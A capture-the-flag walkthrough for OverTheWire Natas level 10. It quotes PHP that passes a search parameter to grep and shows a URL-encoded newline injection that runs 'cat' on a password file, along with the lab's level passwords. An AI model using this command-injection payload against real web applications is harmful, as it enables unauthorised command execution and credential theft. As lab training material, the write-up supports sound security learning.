# Natas Level 10 → Level 11
(Updated: 13 August 2025)

## Credentials
- **Username:** `natas10`
- **Password:** `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

## Connection
Level url: [http://natas10.natas.labs.overthewire.org/](http://natas10.natas.labs.overthewire.org/)

## Steps to Solve
1. Step 1 - You can access the code by doing the shortcut `Cmd + Shift + C` (for Mac) or `Ctrl + Shift + C` (for Windows)
2. Step 2 - You can see there is a `Search bar` so we have to do something with it to get the password. Let's `View sourcecode`
3. Step 3 - Unlike level 9 this level has block `;` so we have to do something else. There is a PHP code:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
**We can try different method by using `%0a` in the terminal, to stimulate exactly like the `Enter` and gets the password.**

4. Step 4 - Add `needle=anything%0acat /etc/natas_webpass/natas11` to `needle` query params in the URL => [http://natas10.natas.labs.overthewire.org/?needle=anything%0acat%20/etc/natas_webpass/natas11&submit=Search](http://natas10.natas.labs.overthewire.org/?needle=anything%0acat%20/etc/natas_webpass/natas11&submit=Search) and get the password.
- It will run 2 separate commands:
    - `grep -i anything dictionary.txt`
    - `cat /etc/natas_webpass/natas11`
5. Step 5 - Take the password to the next level.

## Next Level Password
`UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`
